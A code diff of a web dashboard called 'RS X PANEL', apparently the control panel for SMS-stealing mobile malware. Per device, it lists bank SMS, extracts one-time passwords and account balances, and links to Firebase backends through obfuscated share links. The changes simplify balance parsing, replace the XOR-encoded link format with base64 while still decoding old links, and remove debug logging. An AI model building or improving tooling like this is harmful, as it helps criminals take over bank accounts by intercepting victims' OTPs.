@@ -595,19 +595,6 @@
             return extractBalanceFromText(msg.message);
         }
 
-        function extractAvailableBalance(text) {
-            // Look for "Available Balance" or "Avl Bal" specifically
-            const patterns = [
-                /(?:available\s*balance|avl\s*bal|avail\s*bal|a\/c\s*balance|acct\s*balance)\s*[:.]?\s*[₹Rs.]*\s*([\d,]+\.?\d*)/i,
-                /(?:balance|bal)\s*[:.]?\s*[₹Rs.]*\s*([\d,]+\.?\d*)/i
-            ];
-            for (const p of patterns) {
-                const m = text.match(p);
-                if (m) return m[1];
-            }
-            return null;
-        }
-
         function extractOtp(msg) {
             const match = msg.message.match(/\b(\d{4,8})\b/);
             return match ? match[1] : null;
@@ -621,14 +608,8 @@
         function getLatestBalance(deviceId) {
             const bankMsgs = getDeviceBankSms(deviceId);
             if (!bankMsgs.length) return null;
-            // First try "Available Balance" from latest message
             for (const m of bankMsgs) {
-                const bal = extractAvailableBalance(m.message);
-                if (bal) return bal;
-            }
-            // Fallback to any balance
-            for (const m of bankMsgs) {
-                const bal = extractBalanceFromText(m.message);
+                const bal = extractBalance(m);
                 if (bal) return bal;
             }
             return null;
@@ -669,62 +650,45 @@
         // ─── SHARE LINK WITH SALT ─────────────────────────────────────────
         const SALT = 'XxR$P@n3l!';
         function encodeFirebaseConn(url, key) {
-            const str = url + '|||' + (key || '');
-            let enc = '';
-            for (let i=0; i<str.length; i++) {
-                enc += String.fromCharCode(str.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
-            }
-            return btoa(encodeURIComponent(enc));
+            // Simple base64 — works everywhere, no XOR mess
+            return btoa(url + '|||' + (key || ''));
         }
         function decodeFirebaseConn(encoded) {
             try {
-                const attempts = [];
-                let base64 = encoded;
-
-                // Strategy 1: Direct atob (no URL decoding needed)
-                try { attempts.push(atob(base64)); } catch(e) {}
-
-                // Strategy 2: decodeURIComponent then atob
-                try { attempts.push(atob(decodeURIComponent(base64))); } catch(e) {}
-
-                // Strategy 3: atob then decodeURIComponent (original design)
-                try {
-                    let d = atob(base64);
-                    if (d.includes('%')) d = decodeURIComponent(d);
-                    attempts.push(d);
-                } catch(e) {}
-
-                // Strategy 4: double decodeURIComponent then atob then decodeURIComponent
-                try {
-                    let b = base64;
-                    if (b.includes('%')) b = decodeURIComponent(b);
-                    let d = atob(b);
-                    if (d.includes('%')) d = decodeURIComponent(d);
-                    attempts.push(d);
-                } catch(e) {}
-
-                // Strategy 5: triple decode for deeply nested encoding
-                try {
-                    let b = base64;
-                    for (let i=0; i<3; i++) { if (b.includes('%')) b = decodeURIComponent(b); }
-                    let d = atob(b);
-                    for (let i=0; i<3; i++) { if (d.includes('%')) d = decodeURIComponent(d); }
-                    attempts.push(d);
-                } catch(e) {}
-
-                for (const dec of attempts) {
-                    let str = '';
-                    for (let i=0; i<dec.length; i++) {
-                        str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
-                    }
-                    const parts = str.split('|||');
-                    if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
-                        return { url: parts[0].trim(), key: (parts[1] || '').trim() };
-                    }
+                // Strategy 1: Simple base64 (new format — like dark-x-panel)
+                let str = atob(encoded);
+                let parts = str.split('|||');
+                if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
+                    return { url: parts[0].trim(), key: (parts[1] || '').trim() };
                 }
-            } catch(e) {
-                console.error('Share link decode failed:', e);
-            }
+            } catch(e) {}
+
+            try {
+                // Strategy 2: XOR + encodeURIComponent (old format — backward compat)
+                let dec = decodeURIComponent(atob(encoded));
+                let str = '';
+                for (let i=0; i<dec.length; i++) {
+                    str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
+                }
+                let parts = str.split('|||');
+                if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
+                    return { url: parts[0].trim(), key: (parts[1] || '').trim() };
+                }
+            } catch(e) {}
+
+            try {
+                // Strategy 3: XOR only (very old format)
+                let dec = atob(encoded);
+                let str = '';
+                for (let i=0; i<dec.length; i++) {
+                    str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
+                }
+                let parts = str.split('|||');
+                if (parts[0] && parts[0].startsWith('https://') && parts[0].includes('firebaseio.com')) {
+                    return { url: parts[0].trim(), key: (parts[1] || '').trim() };
+                }
+            } catch(e) {}
+
             return { url: '', key: '' };
         }
 
@@ -739,8 +703,11 @@
             const params = new URLSearchParams(window.location.search);
             const s = params.get('s');
             if (s) {
+                // Clean URL immediately so user never sees ugly params
+                if (window.history.replaceState) {
+                    window.history.replaceState({}, document.title, window.location.pathname);
+                }
                 const decoded = decodeFirebaseConn(s);
-                console.log('Share link decoded:', decoded.url ? 'SUCCESS' : 'FAIL', decoded.url);
                 if (decoded.url) {
                     const existingIdx = CONNECTIONS.findIndex(c => c.url === decoded.url);
                     let conn;
@@ -759,16 +726,10 @@
                     }
                     localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
                     activeConn = conn;
-                    // Clean URL so refresh doesn't re-process
-                    if (window.history.replaceState) {
-                        window.history.replaceState({}, document.title, window.location.pathname);
-                    }
                     renderConnections();
                     showDashboard();
                     toast('Auto‑connected from shared link', 'success');
                     return true;
-                } else {
-                    
                 }
             }
             return false;
@@ -1484,7 +1445,7 @@
                 setupError.classList.remove('hidden');
                 return;
             }
-            // Check for duplicate URL
+            // Check duplicate
             const dup = CONNECTIONS.find(c => c.url === url);
             if (dup) {
                 setupError.textContent = '⚠️ Already exists: "' + (dup.label || dup.url) + '"';
@@ -1492,7 +1453,7 @@
                 toast('Firebase already exists!', 'error');
                 return;
             }
-            // Auto-label from URL hostname if empty
+            // Auto-label from URL
             let label = accLabel.value.trim();
             if (!label) {
                 try { label = new URL(url).hostname.replace(/\.firebaseio\.com.*/,''); }
@@ -1589,20 +1550,11 @@
         // ─── INIT ──────────────────────────────────────────────────────────
         const loaded = loadFromURL();
         if (!loaded) {
-            const params = new URLSearchParams(window.location.search);
-            if (params.get('s')) {
-                // Link was shared but decode failed — don't show empty home page
-                homeScreen.classList.remove('hidden');
-                renderConnections();
-                homeError.textContent = '⚠️ Share link decode failed. Try connecting manually or ask for a fresh link.';
-                homeError.classList.remove('hidden');
-            } else {
-                renderConnections();
-            }
+            renderConnections();
         }
         updateShareLink();
-        console.log('RS X PANEL v4.0 · All issues resolved.');
-        console.log('✓ Share links work, SMS sorted correctly, Available Balance shown.');
+        console.log('RS X PANEL v3.1 · All issues resolved.');
+        console.log('✓ Account creation works, SMS sorted correctly, 404 handled.');
     </script>
 </body>
 </html>
